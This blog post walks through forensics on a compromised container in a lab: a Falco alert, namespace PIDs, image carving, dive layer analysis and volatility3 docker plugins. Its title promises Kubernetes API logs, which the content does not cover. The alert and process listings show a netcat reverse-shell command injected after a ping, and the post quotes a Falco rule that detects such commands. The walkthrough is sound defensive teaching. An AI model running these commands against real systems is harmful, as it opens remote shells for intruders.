---
title: 'kubernetes_logs_for_responders'
date: 2022-06-11
tags: ["containers", "linux", "dfir", "kubernetes"]
categories: ["containkubernetesers"]
aliases: ["/k8s-api-logs-for-responders"]
author: "Travis"
summary: "An overview of the Kubernetes api logs. What fields are useful, and some places where log visibility might be missing in most environments."

---

---

An overview of the Kubernetes api logs. What fields are useful, and some places where log visibility might be missing in most environments. 

---
### PIDs

Before we get into the actual analysis lets start with a quick overview of how processes exist in containers. When you run PS inside a container you typically get a very short list of running processes and not all of the processes that are currently running on the underlying host. This is due to one of the foundational compoents that make a container a container, namespaces. Linux namespaces *isolate* the proceses within containers. What does this look like in practice? Lets look.

Take for example the following line from a `ps aux` output ran on a host.

```bash
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root        2954  0.0  0.0   4200   740 pts/1    S+   02:41   0:00 ping 8.8.8.8
```

We can see this process has a PID of 2954. Looking at pstree we can see this process is a child of bash, which is a child of containerd-shim

```bash
systemd(1)───containerd-shim(2396)───bash(2604)───ping(2954)
```

If we exec into the container and run the same ps commands we get a completely different pid:

```bash
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         379  0.0  0.0   4200   740 pts/1    S+   02:41   0:00 ping 8.8.8.8
```

This is due to the Linux namespace restricting our view so we can only see processes that exist "within" the container. If we attempt to kill PID 2954 on the host from within the container we will get an error that no such process exists. We could however kill process 379 without any issue.

For a much more indepth explaination I highly reccommend the book [Container Security: Fundamental Technology Concepts that Protect Containerized Applications](https://www.oreilly.com/library/view/container-security/9781492056690/) by Liz Rice. Last I checked Aqua security was giving the ebook away for free.

---
### The Scene
Moving on to a more practical example let's pretend that we get an alert from a Falco agent running on a host. In fact several alerts are generated for this behavior, but for our purposes just the one will be enough to kick of this investigation. Falco is a great tool and free to use. The fact that it is container aware makes very helpful when looking to detect suspicious and malicious behavior in a container environment. The alert which was generated is below:

```json
{
  "output": "21:39:47.159547041: Warning Netcat runs inside container that allows remote code execution (user=www-data user_loginuid=-1 command=nc 172.31.93.20 9876 -e /bin/sh container_id=60795d68fdee container_name=eloquent_babbage image=webapp:v1.0)",
  "priority": "Warning",
  "rule": "Netcat Remote Code Execution in Container",
  "source": "syscall",
  "tags": [
    "mitre_execution",
    "network",
    "process"
  ],
  "time": "2022-05-10T21:39:47.159547041Z",
  "output_fields": {
    "container.id": "60795d68fdee",
    "container.image.repository": "webapp",
    "container.image.tag": "v1.0",
    "container.name": "eloquent_babbage",
    "evt.time": 1652218787159547100,
    "proc.cmdline": "nc 172.31.93.20 9876 -e /bin/sh",
    "user.loginuid": -1,
    "user.name": "www-data"
  }
}
```

The rule name is `Netcat Remote Code Execution in Container` (ruh roh). In the output fields section we can see all kinds of useful information such as data about the image, the running container name, the command line associated with the alert, and the user that ran the command. Looking at the [rule](https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml#L2462) syntax it is a fairly simple rule.

```bash
 spawned_process and container and
    ((proc.name = "nc" and (proc.args contains "-e" or proc.args contains "-c")) or
     (proc.name = "ncat" and (proc.args contains "--sh-exec" or proc.args contains "--exec" or proc.args contains "-e "
                              or proc.args contains "-c " or proc.args contains "--lua-exec"))
    )
```

The output for the rule is:
```bash
output: >
    Netcat runs inside container that allows remote code execution (user=%user.name user_loginuid=%user.loginuid
    command=%proc.cmdline container_id=%container.id container_name=%container.name image=%container.image.repository:%container.image.tag)
```

If we wanted to have additional information such as process id or parent process id in the output we could add that. Hindsight being what it is, had I thought of this before starting to write this post I would have added pid details to the rule output for additional context.

Comparing the rule to the process cmdline included in the output_fields we can see clearly why it was triggered. 

On the host when we run `ps aux` we see an output similar to the one below. 

```bash
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
www-data   12520  0.0  0.0   4296   796 ?        S    21:53   0:00 sh -c ping  -c 4 & nc 172.31.93.20 9876 -e /bin/sh
```

Digging deeper if we run `pstree -asp 12520` we see that the nc process is a child of apache2. 

```bash
pstree -asp 12520

systemd,1
  └─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock
      └─main.sh,11992 /main.sh
          └─apache2,12323 -k start
              └─apache2,12336 -k start
                  └─sh,12520 -c ping  -c 4 & nc 172.31.93.20 9876 -e /bin/sh
                      └─sh,12522 -c /bin/sh
                          └─sh,12523
```

nc usage is common in most place where Linux is used. It is not common to see nc as a child process of apache2. At this point several additional alerts from Falco start to roll in, and after speaking with the application owner we learn nc was added to the container for troubleshooting connectivity issues, but they always ran it from a shell in the container as root never as the apache user (not ideal but it is what it is). The app owners also confirmed they have not been doing any testing recently. If this were a real scenario this host would probably be isolated if possible and attempts would be made to understand what kind of data is processed on the machine. Thankfully this is just a lab and all of that is out of scope for this post :-).

We know there is an active nc session, but what else has occured in the container? Let's dive into the image a figure it out. 

---
### Carving the running container out

First lets grab the eqivilant of a disk image of the running container this. We'll be able to perform an analysis on the image and it also preserves the image in the event that the container is killed. *Note: this post mainly focuses on the container itself, opperating within a Kubernetes cluster is highly likely in a scenario similar to this. There are additional things that should occur when performing analysis on a Kubernetes cluster to preserve and protect both the running container and the host that the container is running on. Failure to do so may result in the entire node being terminated and all relevant evidence along with it.*

Lets determine the container id where this process lives. We can do this by looking at the `-id` parameter associated with the containerd-shim process from the pstree command. 

```bash
  └─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock
```

If multiple containers exist we would need to trace the tree up to the relevant container-shim process. Additionally in our scenario Falco provided the container id in the alert for us. 

```bash
"container.id": "60795d68fdee",
```

If we want we can run the `docker ps` command to validate the container is still running.

```bash
docker ps
CONTAINER ID   IMAGE                  COMMAND      CREATED       STATUS       PORTS                               NAMES
60795d68fdee   webapp:v1.0   "/main.sh"   3 hours ago   Up 3 hours   0.0.0.0:80->80/tcp, :::80->80/tcp   eloquent_babbage
```

Now that we know the container ID we can create an image from the running container preserving any changes that have occured since the container was launched. The commit command below tells docker to create a new image name `sec-incident`, tag it with `123`, and use the running container id `6079` to build the image. Effectivly taking a snapshot of the container as it currently exists. 

```bash
docker commit 6079 sec-incident:123
```

When we run the `docker images` command we see our new image, as well as the orignal image the container launched with. 

```bash
REPOSITORY             TAG       IMAGE ID       CREATED          SIZE
sec-incident           123       9f64c8bead0e   21 seconds ago   845MB
webapp                 v1.0      7adda9b17363   3 hours ago      714MB
```

Comparing the sizes of the two images there have been lots of changes within the image since it was first launched. Next we will `save` the image to disk so it is portable and can be moved to our analysis workstation.

```bash
docker save sec-incident:123 -o sec-incident.tar
```

It is important to note we are using the `docker save` command specifying the image we created from the running container instead of the `docker export` command on the running container. Both will produce a tar file. The biggest difference is that the export command will flatten the image/layer history. Save on the other hand will preserve all of the layer history. For our use case preserving the history is very helpful when analyzing how the image has shifted from its initial launch. From here as an analyst the tar files will more than likely be exported to an analysis machine.

Once we are on our analyst workstation we need to perform a `docker load` on the tar file produced from the `docker save` command above. This will trigger the following output:

```bash
docker load < sec-incident.tar
a75caa09eb1f: Loading layer [==================================================>]    105MB/105MB
80f9a8427b18: Loading layer [==================================================>]  494.7MB/494.7MB
97a1040801c3: Loading layer [==================================================>]  7.168kB/7.168kB
acf8abb873ce: Loading layer [==================================================>]  5.655MB/5.655MB
9713610e6ec4: Loading layer [==================================================>]  5.632kB/5.632kB
73e92d5f2a6c: Loading layer [==================================================>]  5.658MB/5.658MB
585e40f29c46: Loading layer [==================================================>]  114.3MB/114.3MB
deeea3c4d56f: Loading layer [==================================================>]  2.048kB/2.048kB
9ef9e3967882: Loading layer [==================================================>]  121.7MB/121.7MB
Loaded image: sec-incident-123:latest
```

From this output we can tell there are 9 unique layers to this image. 

---
### What is an Image

Before progressing any further lets take a step back and talk about what an image is. An image according to docker.com is "...a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings." Technically however an image is just a collection of tar'd files/folders. Each layer is a folder within the tar file. Within each layers folder contains information about the layer, and then any files associated with that particular layer.

In our example when we extract the sec-incident.tar file we see an output that contains a layer folder, inside of that folder is a VERSION, json, and layer.tar file. Additionally at the root level of the image there is `manifest.json`, `repositories`, and a `9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json` file. The `9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json` file uses the hash of the image. The image hash is a sha256sum of this config file. 

```bash
tar -xvf sec-incident.tar
1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/
1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/VERSION
1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/json
1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar
2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/
2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/VERSION
2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/json
2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar
69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/
69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/VERSION
69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/json
69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar
6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/
6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/VERSION
6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/json
6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar
8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/
8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/VERSION
8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/json
8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar
9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/
9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/VERSION
9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/json
9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar
9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json
a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/
a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/VERSION
a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/json
a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar
c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/
c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/VERSION
c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/json
c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar
c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/
c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/VERSION
c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/json
c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar
ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/
ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/VERSION
ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/json
ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar
caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/
caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/VERSION
caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/json
caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar
manifest.json
repositories
```

The `manifest.json` file shows us information about the layers in the image as well as the repo/tags associated with the image

```json
[
  {
    "Config": "9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json",
    "RepoTags": [
      "sec-incident:123"
    ],
    "Layers": [
      "69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar",
      "9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar",
      "1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar",
      "c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar",
      "c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar",
      "a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar",
      "2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar",
      "caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar",
      "8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar",
      "ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar",
      "6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar"
    ]
  }
]
```

The `repositories` file is just meta-data about the image:

```json
{"sec-incident":{"123":"6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2"}}
```

When we look at the `9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json` config file we can see all of the layers and what commands were used to create the layer. Below is a snip from the file:

```json
    {
      "created": "2018-10-12T17:49:01.240444043Z",
      "created_by": "/bin/sh -c #(nop)  ENTRYPOINT [\"/main.sh\"]",
      "empty_layer": true
    },
    {
      "created": "2022-05-10T21:32:10.671619454Z",
      "created_by": "/bin/sh -c #(nop) COPY file:2d20aa4eee806c995fcc211ba0077b67c72aa53ac0ba27ec57a721820907c4ff in /bin/nc "
    },
    {
      "created": "2022-05-10T21:32:11.329409992Z",
      "created_by": "/bin/sh -c chmod +x /bin/nc"
    },
    {
      "created": "2022-05-11T00:38:09.016419258Z"
    }
```
In the above output we can clearly see the original image launch layer which was created 2018-10-12 by the command `/bin/sh -c` with the entrypoint of `main.sh`. Below that we see two additional layers added by the application owner for troubleshooting purposes where they copied `nc` into the image and then made the file executable `/bin/sh -c chmod +x /bin/nc`. The last layer only has a timestamp, but no other information. This is the layer where we will want to look because it will contain any changes to the file system since the container was started. Before we start to unpack each layer and manually trompsing through all the files lets make things easier and utilize a tool built specifically to help us visualize the data we want to see.

---
### Dive

There are a few different tools that can be used to perform static analysis of a container image. One of my favorites is [dive](https://github.com/wagoodman/dive). Dive is "a tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI Image." Obviously for our purposes we do not care about shrinking the image we just want to be able to explore the image at each of the various layers.

Once installed on our analysis system we can run the tool with:

```bash
dive sec-incident:123
```

This will process our image and provide us with a really nice ui to navigate through it.

Once the ui loads in the top left panel we can see all of the image layers. Using the arrow keys we can move between the layers. The bottom layer contains all of the changes that occurred since the image was started up to the time we saved the image. In our case ~132MB of changes occured.

![dive-layers.png](images/dive-layers.png "dive-layers")

In the section below we can see the layer details. This includes the ID and Digest. We will use the Id (`6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2`) later when we go to extract specific files from the image.

![dive-layer-details.png](images/dive-layer-details.png "dive-layer-details")

On the right we can see all of the contents of the filesystem at the current layer. Pressing `tab` will allow us to use the arrow keys once again to navigate through the file system, space will collapse/expand a folder. This includes files from the previous layers. Dive color codes the files to show files that are new to the layer (green) and those files which have been modified when compared to the previous layer (yellow).

![dive-layer-contents.png](images/dive-layer-contents.png "dive-layer-contents")

We can see that a new php session file was created, and that the access and error log files were modified, likely due to webtraffic to the application. In the image below we see several new files that have been created. Each file is worth digging into deeper to gain some understanding as to what has occurred.

![dive-layer-contents-2.png](images/dive-layer-contents-2.png "dive-layer-contents-2")

Unfortunatly dive does not offer the ability to extract a file directly. To dig into the files themselves to better understand what has occured we will have to extract the layer from the raw image file. 

---
### File Analysis
Back in our extracted image folder we can use the layer id identified using Dive to selectivly target the layer we want.

We want to carve files out that occured within the most recent layer created for the image. Using the what we learned from Dive we know the layer id we want to explore is `6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2`. 

![extracted-layer-details.png](images/extracted-layer-details.png "extracted-layer-details")

Within the folder for the layer we will extract the `layer.tar` file with a  `tar -xvf layer.tar`. This presents us with the changes in the filesystem at the current layer of the image. Using what we learned from Dive above we can navigate to files of interest and begin to inspect them to determine what there intent was.

---
### Intermission

During analysis we learn the `curl` binary was uploaded in parts and then rebuilt as `ifj`. A coinminer (xmrig) was also uploaded in parts and rebuilt as the binary `8`. Additionally several webshells were uploaded. Given the timestamps of when all of the files appear to have been created it would appear it was the same actor copying the same shell to maintain access in the event that one of the shells was discovered and deleted. The web access logs confirm that the same ip address was used for all of the requests where malicious files started to appear. The webshells were identical copies of a version of Web Shell Orb, a fairly full featured webshell with various capabilities.

---
### Memory Analysis

Collection of memory occurs just as it would for any other Linux host. For this post LiME was used, but avml is also an option. Since this is a lab environment and the scenario is a bit contrived disk analysis tells enough of the story for us to understand what has occurred. If this were a bit more realistic the 8 binary probably would have been deleted from disk and we would either recover it from `/proc/<PID>/exe` or we would carve it out of memory to perform analysis on it and determine what the binaries purpose was. With that in mind I chose to skip digging into that and instead chose to dig into some special things about container memory analysis with volatility.


#### Volatility2

When it comes to memory analysis with volatility there really isn't anything special about analyzing activity that has occurred in a container vs outside on the host. The most important thing to remember is when analyzing processes is to utilize the PID of the suspicious processes on at the host level and not the container native PIDs.


#### Volatility3

Container analysis with volatility3 is a little bit different than it is with volatility. The main reason for this is the `volatility-docker` plugin built by Ofek Shaked & Amir Sheffer. This plugin adds namespace support and various docker specific commands which can aid in understanding the dump. 

One example is the additional argument added to the suite of ps commands: `nsinfo`. This argument will display information about the namespace associated with a particular pid. 

```bash
python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.pstree.PsTree --nsinfo
```

Below is a sample output of the pstree module showing nsinfo. 

|PID|PPID|COMM|Start Time (UTC)|PID in NS|UTS NS|IPC NS|MNT NS|NET NS|PID NS|USER NS|
|----|----|----|----|----|----|----|----|----|----|----|
|* 11971|1|containerd-shim|2022-05-10 21:37:46.453|11971|4026531838|4026531839|4026531840|4026532040|4026531836|4026531837|
|** 11992|11971|main.sh|2022-05-10 21:37:46.489|1|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|
|*** 12323|11992|apache2|2022-05-10 21:37:49.355|308|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|
|**** 12334|12323|apache2|2022-05-10 21:37:49.428|319|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|
|**** 12335|12323|apache2|2022-05-10 21:37:49.428|320|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|
|**** 12336|12323|apache2|2022-05-10 21:37:49.429|321|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|
|**** 12337|12323|apache2|2022-05-10 21:37:49.429|322|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|
|***** 12795|12337|sh|2022-05-11 00:31:20.254|411|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|
|****** 12797|12795|sh|2022-05-11 00:31:20.255|413|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|
|******* 12798|12797|sh|2022-05-11 00:31:20.261|414|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|
|******** 12816|12798|8|2022-05-11 00:33:19.062|430|4026532238|4026532239|4026532237|4026532242|4026532240|4026531837|

In the table above we can see `main.sh` is a child of containerd-shim which indicates this is a process in a container. Additionally the pid for `main.sh` in the NS (PID in NS column) is 1 which tells us this is the pid used to start the container. Below that we can see other PIDs which are related to host pid 11992, and are in the same namespace. We can use the namespace information to determine all of the pids associated with this container even if they have forked away and no longer appear as child processes. Furthermore this mapping can be really helpful if the initial alert source that triggered the investigation is only showing the PID within the namespace.

The docker plugin itself adds several new capabilities. The output below shows the available arguments: 

```bash
python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.docker.Docker -h

optional arguments:
  -h, --help            show this help message and exit
  --detector            Detect Docker daemon / containers in memory
  --ps                  List of running containers
  --ps-extended         Extended list of running containers
  --inspect-caps        Inspect containers capabilities
  --inspect-mounts      Show a list of containers mounts
  --inspect-mounts-extended
                        Show detailed list of containers mounts
  --inspect-networks    Show detailed list of containers networks
  --inspect-networks-extended
                        Show detailed list of containers networks
```

The `--detector` argument attempts to detect if docker was being used on the system. This can be helpful if you are not sure if docker was being used on the system.
```bash
python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --detector
Volatility 3 Framework 2.1.0
Progress:  100.00               Stacking attempts finished
Docker inetrface        Docker veth     Mounted Overlay FS      Containerd-shim is running

True    True    True    True
```

`--ps` and `--ps-extended` emulates the `docker ps` command showing all containers within the dump and details about them.
```bash
python3 /home/ubuntu/git/volatility3/vol.py  -f /home/ubuntu/webserver.lime docker.Docker --ps
Volatility 3 Framework 2.1.0
Progress:  100.00               Stacking attempts finished
Container ID    Command Creation Time (UTC)     PID

60795d68fdee     main.sh 2022-05-10 16:29:25.908 11992

---

python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --ps-extended
Volatility 3 Framework 2.1.0
Progress:  100.00               Stacking attempts finished
Creation time (UTC)     Command Container ID    Is privileged   PID     Effective UID

2022-05-10 16:29:25.908 main.sh 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216        False   11992   0
```

To see the capabilities associated with a container the `--inspect-caps` argument can be used. Having an understanding of a containers capabilities can help shed light on what possible damage it could cause to the underlying system or neighboring containers. This will generate an output similar to below:
```bash
python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-caps
Volatility 3 Framework 2.1.0
Progress:  100.00               Stacking attempts finished
PID     Container ID    Effective Capabilities Mask     Effective Capabilities Mames

11992    60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216        0xa80425fb      CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP
```

The `--inspect-networks` argument will show the containers and the associated networks. If more than one container is in the same network the truncated container id's are comma seperated.
```bash
python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-networks
Volatility 3 Framework 2.1.0
Progress:  100.00               Stacking attempts finished
Network /16 Segment     Containers IDs

172.17  60795d68fdee, <SOME OTHER CONTAINER>
```
